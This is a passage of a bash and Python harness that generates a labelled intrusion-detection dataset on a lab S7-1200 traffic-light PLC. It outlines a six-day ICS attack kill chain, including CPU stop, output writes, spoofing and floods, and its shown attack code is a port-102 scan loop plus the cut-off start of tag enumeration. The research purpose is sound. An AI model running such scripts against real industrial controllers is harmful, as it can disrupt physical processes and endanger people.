#!/usr/bin/env bash
set -euo pipefail

# ================================================================
# run_day.sh
# Dataset collection for one ATTACKER host, one CONTROLLER host, one S7 PLC.
# Traffic Light scenario (S7-1200).
#
# Main safety choices:
#   - Rack/slot/interface/IP are read from testbed.conf or CLI.
#   - CPU STOP/START attack is disabled by default.
#   - RWRITE_BURST writes PA/Q outputs only with --allow-pa-write-attacks.
#   - Controller HMI is observe-only by default.
#   - Timeline schema carries session_id, host_id, episode_id, day, note.
#
# Kill chain:
#   Day 1: Baseline — 100% benign
#   Day 2: Reconnaissance — SCAN_PORT + ENUM_TAGS
#   Day 3: Initial Impact — CPU_STOP + RWRITE_BURST
#   Day 4: Process Manipulation — SETPOINT_ATTACK + SENSOR_SPOOF + STEALTHY_WRITE
#   Day 5: Denial of Service — S7_FLOOD + SYN_FLOOD + PROTOCOL_FUZZ
#   Day 6: Mixed Test — all scenarios shuffled
#
# MITRE ATT&CK for ICS:
#   T0846, T0861, T0816, T0836, T0856, T0814
#
# Pre-run checklist:
#   1. Set TARGET_IP/RACK/SLOT and CAPTURE_IFACE in testbed.conf.
#   2. Confirm PLC is powered, reachable, in a lab-safe state, and PUT/GET is enabled.
#   3. Run: tshark -D
#   4. Run: bash run_day.sh --day 1 --role attacker --preflight-only --no-capture
#   5. Confirm Git Bash resolves python/python3 to the environment with python-snap7.
# ================================================================

[[ -f testbed.conf ]] && source ./testbed.conf

if [[ -z "${PY_CMD:-}" ]]; then
    command -v python3 &>/dev/null && PY_CMD="python3" || PY_CMD="python"
fi

export PYTHONPATH="${PYTHONPATH:-.}"

DAY=""
ROLE=""
TARGET_IP="${TARGET_IP:-192.168.1.10}"
RACK="${RACK:-0}"
SLOT="${SLOT:-1}"
CAPTURE_IFACE="${CAPTURE_IFACE:-${IFACE:-}}"
CAPTURE_ENABLED="${CAPTURE_ENABLED:-1}"
CAPTURE_FILTER="${CAPTURE_FILTER:-}"
SESSION_ID="${SESSION_ID:-}"
HOST_ID="${HOST_ID:-}"
RUN_DURATION_OVERRIDE=""
PREFLIGHT_ENABLED="${PREFLIGHT_ENABLED:-1}"
REQUIRE_PREFLIGHT="${REQUIRE_PREFLIGHT:-1}"
ENABLE_CPU_CONTROL_ATTACK="${ENABLE_CPU_CONTROL_ATTACK:-0}"
ALLOW_PA_WRITE_ATTACKS="${ALLOW_PA_WRITE_ATTACKS:-0}"
COLLECTION_PROFILE="${COLLECTION_PROFILE:-standard}"

CAPTURE_DIR="${CAPTURE_DIR:-captures}"
LOG_DIR="${LOG_DIR:-logs}"
LABEL_DIR="${LABEL_DIR:-labels}"
ATTACK_EVENT_LOG_ENABLED="${ATTACK_EVENT_LOG_ENABLED:-1}"
RESET_OUTPUTS="${RESET_OUTPUTS:-1}"

DAY1_DURATION_S="${DAY1_DURATION_S:-${DUR_DAY1:-14400}}"
DAY2_DURATION_S="${DAY2_DURATION_S:-${DUR_DAY2:-14400}}"
DAY3_DURATION_S="${DAY3_DURATION_S:-${DUR_DAY3:-10800}}"
DAY4_DURATION_S="${DAY4_DURATION_S:-${DUR_DAY4:-14400}}"
DAY5_DURATION_S="${DAY5_DURATION_S:-${DUR_DAY5:-10800}}"
DAY6_DURATION_S="${DAY6_DURATION_S:-${DUR_DAY6:-14400}}"

WARMUP_S="${WARMUP_S:-300}"
BENIGN_GAP_S="${BENIGN_GAP_S:-300}"
COOLDOWN_S="${COOLDOWN_S:-600}"
ATTACK_REPETITIONS="${ATTACK_REPETITIONS:-3}"
ATTACK_DURATION_S="${ATTACK_DURATION_S:-600}"
SHORT_ATTACK_DURATION_S="${SHORT_ATTACK_DURATION_S:-300}"
ATTACK_PROFILE="${ATTACK_PROFILE:-standard}"
DAY2_ATTACK_REPETITIONS="${DAY2_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
DAY3_ATTACK_REPETITIONS="${DAY3_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
DAY4_ATTACK_REPETITIONS="${DAY4_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
DAY5_ATTACK_REPETITIONS="${DAY5_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
DAY6_CYCLES="${DAY6_CYCLES:-1}"

DAY6_GAP_MIN_S="${DAY6_GAP_MIN_S:-120}"
DAY6_GAP_MAX_S="${DAY6_GAP_MAX_S:-900}"
DAY6_SCAN_ENUM_MIN_S="${DAY6_SCAN_ENUM_MIN_S:-600}"
DAY6_SCAN_ENUM_MAX_S="${DAY6_SCAN_ENUM_MAX_S:-1200}"
DAY6_INTEGRITY_MIN_S="${DAY6_INTEGRITY_MIN_S:-480}"
DAY6_INTEGRITY_MAX_S="${DAY6_INTEGRITY_MAX_S:-900}"
DAY6_AVAIL_MIN_S="${DAY6_AVAIL_MIN_S:-180}"
DAY6_AVAIL_MAX_S="${DAY6_AVAIL_MAX_S:-360}"
DAY6_CPU_MIN_S="${DAY6_CPU_MIN_S:-120}"
DAY6_CPU_MAX_S="${DAY6_CPU_MAX_S:-240}"

ENABLE_TAG_LOGGER="${ENABLE_TAG_LOGGER:-1}"
TAG_LOG_INTERVAL="${TAG_LOG_INTERVAL:-0.5}"
ENABLE_HMI="${ENABLE_HMI:-1}"
HMI_ENABLE_LEGIT_WRITES="${HMI_ENABLE_LEGIT_WRITES:-0}"
HMI_LEGIT_WRITE_PROB="${HMI_LEGIT_WRITE_PROB:-0.02}"
HMI_POLL_MIN_S="${HMI_POLL_MIN_S:-1.0}"
HMI_POLL_MAX_S="${HMI_POLL_MAX_S:-2.0}"
CONTROLLER_PROFILE_EXPLICIT="${CONTROLLER_PROFILE+x}"
CONTROLLER_PROFILE="${CONTROLLER_PROFILE:-mixed}"
CTRL_NORMAL_HMI_S="${CTRL_NORMAL_HMI_S:-5400}"
CTRL_SPARSE_HMI_S="${CTRL_SPARSE_HMI_S:-3600}"
CTRL_TIA_ONLY_S="${CTRL_TIA_ONLY_S:-3600}"
CTRL_IDLE_S="${CTRL_IDLE_S:-1800}"
CTRL_TIA_ATTACK_S="${CTRL_TIA_ATTACK_S:-18000}"
CTRL_TIA_ATTACK_TAG_LOGGER="${CTRL_TIA_ATTACK_TAG_LOGGER:-1}"
CTRL_TIA_ATTACK_TAG_INTERVAL="${CTRL_TIA_ATTACK_TAG_INTERVAL:-2.0}"
CTRL_DAY4_MIXED_NORMAL_HMI_S="${CTRL_DAY4_MIXED_NORMAL_HMI_S:-2400}"
CTRL_DAY4_MIXED_TIA_S="${CTRL_DAY4_MIXED_TIA_S:-2400}"
CTRL_DAY4_MIXED_SPARSE_HMI_S="${CTRL_DAY4_MIXED_SPARSE_HMI_S:-2400}"
CTRL_DAY4_MIXED_IDLE_S="${CTRL_DAY4_MIXED_IDLE_S:-2400}"
CTRL_DAY4_MIXED_TIA_TAG_LOGGER="${CTRL_DAY4_MIXED_TIA_TAG_LOGGER:-1}"
CTRL_ATTACK_MIXED_NORMAL_HMI_S="${CTRL_ATTACK_MIXED_NORMAL_HMI_S:-3600}"
CTRL_ATTACK_MIXED_SPARSE_HMI_S="${CTRL_ATTACK_MIXED_SPARSE_HMI_S:-3600}"
CTRL_ATTACK_MIXED_TIA_ONLY_S="${CTRL_ATTACK_MIXED_TIA_ONLY_S:-7200}"
CTRL_ATTACK_MIXED_IDLE_S="${CTRL_ATTACK_MIXED_IDLE_S:-3600}"
CTRL_ATTACK_MIXED_TIA_TAG_LOGGER="${CTRL_ATTACK_MIXED_TIA_TAG_LOGGER:-1}"
CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER="${CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER:-1}"
CTRL_SPARSE_TAG_LOG_INTERVAL="${CTRL_SPARSE_TAG_LOG_INTERVAL:-2.0}"
CTRL_SPARSE_HMI_POLL_MIN_S="${CTRL_SPARSE_HMI_POLL_MIN_S:-5.0}"
CTRL_SPARSE_HMI_POLL_MAX_S="${CTRL_SPARSE_HMI_POLL_MAX_S:-20.0}"

S7_FLOOD_THREADS="${S7_FLOOD_THREADS:-6}"
SYN_FLOOD_THREADS="${SYN_FLOOD_THREADS:-20}"
FUZZ_PAYLOAD_MIN="${FUZZ_PAYLOAD_MIN:-12}"
FUZZ_PAYLOAD_MAX="${FUZZ_PAYLOAD_MAX:-80}"

usage() {
    cat <<'EOF'
Usage:
  bash run_day.sh --day <1-6> --role <controller|attacker> [options]

Options:
  --target IP             PLC IP address.
  --rack N                PLC rack, default 0.
  --slot N                PLC slot, default 1.
  --iface IFACE           TShark capture interface. Use `tshark -D` to list.
  --session-id ID         Shared session id for controller and attacker.
  --host-id ID            Host id written to labels/tag logs.
  --duration SECONDS      Override role runtime or benign day runtime.
  --no-capture            Run logic without starting tshark.
  --no-preflight          Skip Snap7 preflight.
  --preflight-only        Run preflight and exit.
  --enable-cpu-control    Opt in to CPU_STOP attack. Default is disabled.
  --allow-pa-write-attacks Opt in to PA/Q write attacks (RWRITE_BURST). Default is disabled.
  --collection-profile P  standard|extended_300k. extended_300k targets ~300k 2s windows across day 1-6.

Environment:
  COLLECTION_PROFILE=standard|extended_300k
                          extended_300k lengthens runs, repeats attacks, and varies rates for a larger dataset.
  RESET_OUTPUTS=1|0       Default 1 resets this role's timeline/tag/event outputs at run start.
  CONTROLLER_PROFILE=standard|mixed|tia_portal_attack|attack_mixed|day4_mixed
                          If unset, controller uses mixed background; Day 4 uses day4_mixed.

Examples:
  Controller host:
    bash run_day.sh --day 4 --role controller --session-id tl_s1 --iface "\\Device\\NPF_{GUID}"

  Attacker host:
    bash run_day.sh --day 4 --role attacker --session-id tl_s1 --iface "\\Device\\NPF_{GUID}"
EOF
}

apply_collection_profile() {
    case "$COLLECTION_PROFILE" in
        standard)
            return 0
            ;;
        extended_300k|300k)
            COLLECTION_PROFILE="extended_300k"
            # Approximate target at 2s non-overlapping windows: around 300k across day 1-6.
            DAY1_DURATION_S="72000"
            DAY2_DURATION_S="100800"
            DAY3_DURATION_S="103200"
            DAY4_DURATION_S="158400"
            DAY5_DURATION_S="115200"
            DAY6_DURATION_S="90000"

            WARMUP_S="3600"
            BENIGN_GAP_S="1200"
            COOLDOWN_S="3600"
            ATTACK_DURATION_S="3600"
            SHORT_ATTACK_DURATION_S="1800"
            ATTACK_REPETITIONS="12"
            DAY2_ATTACK_REPETITIONS="12"
            DAY3_ATTACK_REPETITIONS="20"
            DAY4_ATTACK_REPETITIONS="12"
            DAY5_ATTACK_REPETITIONS="12"
            DAY6_CYCLES="3"

            DAY6_GAP_MIN_S="600"
            DAY6_GAP_MAX_S="1800"
            DAY6_SCAN_ENUM_MIN_S="1200"
            DAY6_SCAN_ENUM_MAX_S="2400"
            DAY6_INTEGRITY_MIN_S="900"
            DAY6_INTEGRITY_MAX_S="1800"
            DAY6_AVAIL_MIN_S="600"
            DAY6_AVAIL_MAX_S="1200"

            if [[ "$ATTACK_PROFILE" == "standard" ]]; then
                ATTACK_PROFILE="extended_300k"
            fi

            # Keep process coverage during long engineering/background segments.
            CTRL_NORMAL_HMI_S="36000"
            CTRL_SPARSE_HMI_S="24000"
            CTRL_TIA_ONLY_S="24000"
            CTRL_IDLE_S="18000"
            CTRL_DAY4_MIXED_NORMAL_HMI_S="30000"
            CTRL_DAY4_MIXED_TIA_S="30000"
            CTRL_DAY4_MIXED_SPARSE_HMI_S="30000"
            CTRL_DAY4_MIXED_IDLE_S="30000"
            CTRL_DAY4_MIXED_TIA_TAG_LOGGER="1"
            CTRL_TIA_ATTACK_TAG_LOGGER="1"
            CTRL_ATTACK_MIXED_TIA_TAG_LOGGER="1"
            CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER="1"

            FUZZ_PAYLOAD_MIN="8"
            FUZZ_PAYLOAD_MAX="160"
            ;;
        *)
            echo "[ERROR] Unknown --collection-profile: $COLLECTION_PROFILE" >&2
            echo "[ERROR] Supported: standard, extended_300k" >&2
            exit 1
            ;;
    esac
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --day) DAY="$2"; shift 2 ;;
        --role) ROLE="$2"; shift 2 ;;
        --target) TARGET_IP="$2"; shift 2 ;;
        --rack) RACK="$2"; shift 2 ;;
        --slot) SLOT="$2"; shift 2 ;;
        --iface) CAPTURE_IFACE="$2"; shift 2 ;;
        --session-id) SESSION_ID="$2"; shift 2 ;;
        --host-id) HOST_ID="$2"; shift 2 ;;
        --duration) RUN_DURATION_OVERRIDE="$2"; shift 2 ;;
        --no-capture) CAPTURE_ENABLED="0"; shift ;;
        --no-preflight) PREFLIGHT_ENABLED="0"; shift ;;
        --preflight-only) PREFLIGHT_ONLY="1"; shift ;;
        --enable-cpu-control) ENABLE_CPU_CONTROL_ATTACK="1"; shift ;;
        --allow-pa-write-attacks) ALLOW_PA_WRITE_ATTACKS="1"; shift ;;
        --collection-profile) COLLECTION_PROFILE="$2"; shift 2 ;;
        -h|--help) usage; exit 0 ;;
        *) echo "[ERROR] Unknown option: $1" >&2; usage; exit 1 ;;
    esac
done

[[ -z "$DAY" ]] && { echo "[ERROR] Missing --day (1-6)" >&2; usage; exit 1; }
[[ -z "$ROLE" ]] && { echo "[ERROR] Missing --role" >&2; usage; exit 1; }
[[ "$DAY" =~ ^[1-6]$ ]] || { echo "[ERROR] DAY must be 1..6" >&2; exit 1; }
[[ "$ROLE" == "controller" || "$ROLE" == "attacker" ]] || { echo "[ERROR] ROLE must be controller or attacker" >&2; exit 1; }

if [[ -z "$SESSION_ID" ]]; then
    SESSION_ID="day${DAY}_tl_s1"
fi
if [[ -z "$HOST_ID" ]]; then
    if [[ "$ROLE" == "controller" ]]; then
        HOST_ID="${CONTROLLER_HOST_ID:-controller_host}"
    else
        HOST_ID="${ATTACKER_HOST_ID:-attacker_host}"
    fi
fi
if [[ -z "$CAPTURE_FILTER" ]]; then
    CAPTURE_FILTER="host $TARGET_IP"
fi
apply_collection_profile
if [[ -z "$CONTROLLER_PROFILE_EXPLICIT" && "$DAY" == "4" && "$ROLE" == "controller" ]]; then
    CONTROLLER_PROFILE="day4_mixed"
fi

mkdir -p "$CAPTURE_DIR/day${DAY}" "$LOG_DIR" "$LABEL_DIR"

declare -a PIDS=()
cleanup() {
    for p in "${PIDS[@]:-}"; do
        kill "$p" 2>/dev/null || true
    done
}
trap cleanup EXIT INT TERM

echo "=== run_day.sh day=$DAY role=$ROLE target=$TARGET_IP rack=$RACK slot=$SLOT session=$SESSION_ID host=$HOST_ID controller_profile=$CONTROLLER_PROFILE collection_profile=$COLLECTION_PROFILE attack_profile=$ATTACK_PROFILE ==="
if [[ "$COLLECTION_PROFILE" == "extended_300k" ]]; then
    echo "[profile] extended_300k: targets roughly 300k non-overlapping 2s windows across day 1-6. Run controller and attacker with the same profile/session."
fi
if [[ "$ENABLE_CPU_CONTROL_ATTACK" != "1" ]]; then
    echo "[info] CPU_STOP attack disabled. Set ENABLE_CPU_CONTROL_ATTACK=1 or --enable-cpu-control only if PLC permits it."
fi
if [[ "$ALLOW_PA_WRITE_ATTACKS" != "1" ]]; then
    echo "[info] PA/Q write attacks disabled. Use --allow-pa-write-attacks only in a safe lab."
fi

# ── Helpers ──────────────────────────────────────────────────────

now_ms() {
    "$PY_CMD" -c "import time; print(int(time.time() * 1000))"
}

label_file() {
    echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_timeline.csv"
}

attack_event_file() {
    echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_attack_events.csv"
}

init_role_outputs() {
    [[ "$RESET_OUTPUTS" == "1" ]] || return 0
    local lf
    lf="$(label_file)"
    echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id,episode_id,day,note" > "$lf"
    if [[ "$ROLE" == "attacker" && "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
        rm -f "$(attack_event_file)"
    fi
    TAG_LOG_FILE_INITIALIZED="0"
    echo "[init] reset role outputs: timeline=$lf reset_outputs=$RESET_OUTPUTS"
}

label() {
    local scenario="$1"
    local action="$2"
    local episode_id="${3:-}"
    local note="${4:-}"
    local ts
    local f
    ts="$(now_ms)"
    f="$(label_file)"
    [[ ! -f "$f" ]] && echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id,episode_id,day,note" > "$f"
    note="${note//,/;}"
    episode_id="${episode_id//,/;}"
    printf '%s,%s,%s,%s,%s,%s,%s,%s\n' "$ts" "$scenario" "$action" "$SESSION_ID" "$HOST_ID" "$episode_id" "$DAY" "$note" >> "$f"
    echo "[$(date +%H:%M:%S)] label $scenario $action episode=$episode_id note=$note"
}

wait_s() {
    local seconds="$1"
    local message="${2:-wait}"
    [[ "$seconds" -le 0 ]] && return 0
    echo "[wait] ${seconds}s -- $message"
    sleep "$seconds"
}

duration_for_day() {
    local var="DAY${DAY}_DURATION_S"
    if [[ -n "$RUN_DURATION_OVERRIDE" ]]; then
        echo "$RUN_DURATION_OVERRIDE"
    else
        echo "${!var}"
    fi
}

rand_duration() {
    local base="${1:-$ATTACK_DURATION_S}"
    "$PY_CMD" -c "import random,sys; b=max(1,int(float(sys.argv[1]))); lo=max(1,int(b*0.75)); hi=max(lo,int(b*1.25)); print(random.randint(lo, hi))" "$base"
}

rand_range() {
    local min_s="$1"
    local max_s="$2"
    "$PY_CMD" -c "import random,sys; lo=max(1,int(float(sys.argv[1]))); hi=max(lo,int(float(sys.argv[2]))); print(random.randint(lo, hi))" "$min_s" "$max_s"
}

# ── Capture ──────────────────────────────────────────────────────

start_capture() {
    local suffix="$1"
    local pcap="$CAPTURE_DIR/day${DAY}/${SESSION_ID}_${suffix}.pcapng"
    if [[ "$CAPTURE_ENABLED" != "1" ]]; then
        echo "[$suffix] capture disabled"
        return 0
    fi
    tshark -n -i "$CAPTURE_IFACE" -f "$CAPTURE_FILTER" -w "$pcap" -q \
        -o "tls.desegment_ssl_records:FALSE" \
        -o "tls.desegment_ssl_application_data:FALSE" &
    PIDS+=("$!")
    echo "[$suffix] tshark -> $pcap"
}

print_tshark_interfaces() {
    if command -v tshark &>/dev/null; then
        echo "[capture] Available TShark interfaces:"
        tshark -D || true
    else
        echo "[capture] tshark is not in PATH. Install Wireshark/TShark and reopen Git Bash/terminal."
    fi
}

validate_capture_config() {
    [[ "$CAPTURE_ENABLED" == "1" ]] || return 0
    if ! command -v tshark &>/dev/null; then
        echo "[ERROR] CAPTURE_ENABLED=1 but tshark was not found." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
    if [[ -z "$CAPTURE_IFACE" ]]; then
        echo "[ERROR] CAPTURE_ENABLED=1 but CAPTURE_IFACE/--iface is empty." >&2
        echo "[ERROR] Run 'tshark -D' and set CAPTURE_IFACE in testbed.conf or pass --iface." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
    local ifaces
    ifaces="$(tshark -D 2>/dev/null || true)"
    if [[ "$CAPTURE_IFACE" =~ ^[0-9]+$ ]]; then
        if ! grep -Eq "^[[:space:]]*${CAPTURE_IFACE}\." <<<"$ifaces"; then
            echo "[ERROR] TShark interface index '$CAPTURE_IFACE' was not found." >&2
            print_tshark_interfaces >&2
            exit 2
        fi
    elif ! grep -Fq -- "$CAPTURE_IFACE" <<<"$ifaces"; then
        echo "[ERROR] TShark interface '$CAPTURE_IFACE' was not found." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
}

# ── Preflight ────────────────────────────────────────────────────

preflight_plc() {
    "$PY_CMD" - <<PYEOF
import sys
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")

c = snap7.client.Client()
try:
    print(f"[preflight] connect {target} rack={rack} slot={slot}", flush=True)
    c.connect(target, rack, slot)
    state = "UNKNOWN"
    try:
        state = str(c.get_cpu_state())
    except Exception as exc:
        print(f"[preflight][WARN] cannot read CPU state: {exc}", flush=True)
    print(f"[preflight] CPU state: {state}", flush=True)

    m = c.read_area(Areas.MK, 0, 0, 82)
    print(f"[preflight] read M area OK ({len(m)} bytes)", flush=True)
    try:
        q = c.read_area(Areas.PA, 0, 0, 1)
        print(f"[preflight] read Q0 OK: 0x{q[0]:02X}", flush=True)
    except Exception as exc:
        print(f"[preflight][WARN] read Q0 failed: {exc}", flush=True)
    c.disconnect()
    sys.exit(0)
except Exception as exc:
    print(f"[preflight][ERROR] Snap7 PUT/GET check failed: {exc}", flush=True)
    try:
        c.disconnect()
    except Exception:
        pass
    sys.exit(2)
PYEOF
}

# ── Restore PLC (traffic light) ─────────────────────────────────

restore_plc() {
    echo "[restore] Traffic light safe restore via Merker area"
    "$PY_CMD" - <<PYEOF || true
import sys
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool, set_dint

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
cpu_control = "$ENABLE_CPU_CONTROL_ATTACK" == "1"
pa_write = "$ALLOW_PA_WRITE_ATTACKS" == "1"

c = snap7.client.Client()
try:
    c.connect(target, rack, slot)

    # 1. If CPU is STOP, try to restart (only if cpu_control enabled)
    try:
        state = str(c.get_cpu_state())
        print(f"[restore] CPU state: {state}", flush=True)
        if "Stop" in state or state == "4":
            if not cpu_control:
                print("[restore][WARN] CPU STOP detected; remote CPU start disabled. Start manually.", flush=True)
            else:
                try:
                    c.plc_hot_start()
                    print("[restore] Sent PLC Hot Start", flush=True)
                except Exception as e_hot:
                    print(f"[restore] Hot Start failed ({e_hot}), trying Cold Start...", flush=True)
                    try:
                        c.plc_cold_start()
                        print("[restore] Sent PLC Cold Start", flush=True)
                    except Exception as e_cold:
                        print(f"[restore] Cold Start also failed ({e_cold})", flush=True)
                time.sleep(3)
    except Exception as e_state:
        print(f"[restore][WARN] cannot read CPU state: {e_state}", flush=True)

    # 2. Reset Q output (only if PA write enabled)
    try:
        if pa_write:
            c.write_area(Areas.PA, 0, 0, bytearray([0]))
            print("[restore] Reset Q Output success", flush=True)
        else:
            print("[restore] Skip Q/PA reset (ALLOW_PA_WRITE_ATTACKS=0)", flush=True)
    except Exception as e_q:
        print(f"[restore][WARN] Failed to reset Q output: {e_q}", flush=True)

    # 3. Reset M area: timers + control bits + sensors
    try:
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_bool(m, 2, 1, True)     # START = 1
        set_bool(m, 2, 2, False)    # STOP  = 0
        set_bool(m, 28, 0, False)   # s1 = 0
        set_bool(m, 28, 1, False)   # s4 = 0
        set_bool(m, 28, 2, False)   # s2 = 0
        set_bool(m, 28, 3, False)   # s3 = 0
        set_dint(m,  3, 30000)      # TimeR1 = 30s
        set_dint(m,  8, 30000)      # TimeR2 = 30s
        set_dint(m, 12,  3000)      # TimeY1 = 3s
        set_dint(m, 16,  3000)      # TimeY2 = 3s
        set_dint(m, 20, 25000)      # TimeG1 = 25s
        set_dint(m, 24, 25000)      # TimeG2 = 25s
        c.write_area(Areas.MK, 0, 0, m)
        print("[restore] Set START=1 and setpoints reset", flush=True)

        # Pulse START: set 1 then back to 0
        time.sleep(0.3)
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_bool(m, 2, 1, False)    # START = 0
        c.write_area(Areas.MK, 0, 0, m)
        print("[restore] START pulse completed", flush=True)
    except Exception as e_m:
        print(f"[restore][WARN] Failed to write M area: {e_m}", flush=True)

    c.disconnect()
    print("[restore] OK", flush=True)
except Exception as exc:
    print(f"[restore][WARN] restore failed: {exc}", flush=True)
    try:
        c.disconnect()
    except Exception:
        pass
PYEOF
    sleep 1
}

# ── Controller ───────────────────────────────────────────────────

start_tag_logger() {
    [[ "$ENABLE_TAG_LOGGER" == "1" ]] || { echo "[ctrl] tag logger disabled"; return 0; }
    local output
    local append_args=()
    output="$LOG_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_tags.csv"
    if [[ "${TAG_LOG_FILE_INITIALIZED:-0}" == "1" ]]; then
        append_args+=("--append")
    else
        TAG_LOG_FILE_INITIALIZED="1"
    fi
    "$PY_CMD" log_tags_dengiaothong.py \
        --target "$TARGET_IP" \
        --rack "$RACK" \
        --slot "$SLOT" \
        --interval "$TAG_LOG_INTERVAL" \
        --output "$output" \
        --session-id "$SESSION_ID" \
        --host-id "$HOST_ID" \
        --scenario-id "BENIGN_READER" \
        --episode-id "${SESSION_ID}:controller:tag_logger" \
        --day "$DAY" \
        "${append_args[@]}" &
    TAG_LOGGER_PID="$!"
    PIDS+=("$!")
    echo "[ctrl] tag logger started"
}

start_hmi() {
    [[ "$ENABLE_HMI" == "1" ]] || { echo "[ctrl] HMI disabled"; return 0; }
    "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
poll_min = float("$HMI_POLL_MIN_S")
poll_max = float("$HMI_POLL_MAX_S")
enable_writes = "$HMI_ENABLE_LEGIT_WRITES" == "1"
write_prob = float("$HMI_LEGIT_WRITE_PROB")

c = snap7.client.Client()
print("[HMI] observe-only polling started" if not enable_writes else "[HMI] polling with rare legitimate START pulses", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
            print("[HMI] connected", flush=True)
        c.read_area(Areas.MK, 0, 0, 82)
        try:
            c.read_area(Areas.PA, 0, 0, 1)
        except Exception:
            pass

        if enable_writes and random.random() < write_prob:
            m = c.read_area(Areas.MK, 0, 2, 1)
            set_bool(m, 0, 1, True)   # START = 1
            set_bool(m, 0, 2, False)  # STOP  = 0
            c.write_area(Areas.MK, 0, 2, m)
            time.sleep(0.2)
            m = c.read_area(Areas.MK, 0, 2, 1)
            set_bool(m, 0, 1, False)  # START = 0
            c.write_area(Areas.MK, 0, 2, m)
            print("[HMI] legitimate START pulse", flush=True)

        time.sleep(random.uniform(poll_min, poll_max))
    except Exception as exc:
        print(f"[HMI][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(2.0)
PYEOF
    HMI_PID="$!"
    PIDS+=("$!")
    echo "[ctrl] HMI started"
}

stop_controller_services() {
    if [[ -n "${HMI_PID:-}" ]]; then
        stop_pid "$HMI_PID"
        HMI_PID=""
    fi
    if [[ -n "${TAG_LOGGER_PID:-}" ]]; then
        stop_pid "$TAG_LOGGER_PID"
        TAG_LOGGER_PID=""
    fi
}

run_controller_segment() {
    local name="$1"
    local duration_s="$2"
    local tag_enabled="$3"
    local hmi_enabled="$4"
    local tag_interval="$5"
    local hmi_min="$6"
    local hmi_max="$7"

    local old_tag="$ENABLE_TAG_LOGGER"
    local old_hmi="$ENABLE_HMI"
    local old_tag_interval="$TAG_LOG_INTERVAL"
    local old_hmi_min="$HMI_POLL_MIN_S"
    local old_hmi_max="$HMI_POLL_MAX_S"

    ENABLE_TAG_LOGGER="$tag_enabled"
    ENABLE_HMI="$hmi_enabled"
    TAG_LOG_INTERVAL="$tag_interval"
    HMI_POLL_MIN_S="$hmi_min"
    HMI_POLL_MAX_S="$hmi_max"

    label "BENIGN_NORMAL" "START" "${SESSION_ID}:day${DAY}:BENIGN:${name}" "controller_profile=${CONTROLLER_PROFILE};segment=${name};duration_s=${duration_s}"
    echo "[ctrl] segment=$name duration=${duration_s}s tag_logger=$ENABLE_TAG_LOGGER hmi=$ENABLE_HMI tag_interval=$TAG_LOG_INTERVAL hmi_poll=${HMI_POLL_MIN_S}-${HMI_POLL_MAX_S}s"
    if [[ "$name" == *"tia_portal"* ]]; then
        echo "[ctrl] Open TIA Portal now: go online, monitor/watch table, diagnostics. Script-generated HMI polling is disabled in this segment."
    fi
    start_tag_logger
    start_hmi
    wait_s "$duration_s" "controller_${name}"
    stop_controller_services
    label "BENIGN_NORMAL" "END" "${SESSION_ID}:day${DAY}:BENIGN:${name}" "controller_profile=${CONTROLLER_PROFILE};segment=${name};duration_s=${duration_s}"

    ENABLE_TAG_LOGGER="$old_tag"
    ENABLE_HMI="$old_hmi"
    TAG_LOG_INTERVAL="$old_tag_interval"
    HMI_POLL_MIN_S="$old_hmi_min"
    HMI_POLL_MAX_S="$old_hmi_max"
}

run_controller_segment_until() {
    local deadline_ms="$1"
    local name="$2"
    local duration_s="$3"
    local tag_enabled="$4"
    local hmi_enabled="$5"
    local tag_interval="$6"
    local hmi_min="$7"
    local hmi_max="$8"
    local current_ms
    local remaining_s

    current_ms="$(now_ms)"
    remaining_s=$(( (deadline_ms - current_ms) / 1000 ))
    if (( remaining_s <= 0 )); then
        return 1
    fi
    if (( duration_s > remaining_s )); then
        duration_s="$remaining_s"
    fi
    run_controller_segment "$name" "$duration_s" "$tag_enabled" "$hmi_enabled" "$tag_interval" "$hmi_min" "$hmi_max"
}

# ── Attack processes (traffic light specific) ────────────────────

start_attack_process() {
    local scenario="$1"
    case "$scenario" in
        SCAN_PORT)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import socket
import time

target = "$TARGET_IP"
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (8.0, 30.0)
elif profile == "extended_300k":
    sleep_range = (0.8, 6.0)
else:
    sleep_range = (0.4, 1.5)
print(f"[SCAN] TCP port 102 scan loop against {target} profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        s = socket.create_connection((target, 102), timeout=1.0)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        ENUM_TAGS)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (2.0, 5.0)
elif profile == "extended_300k":
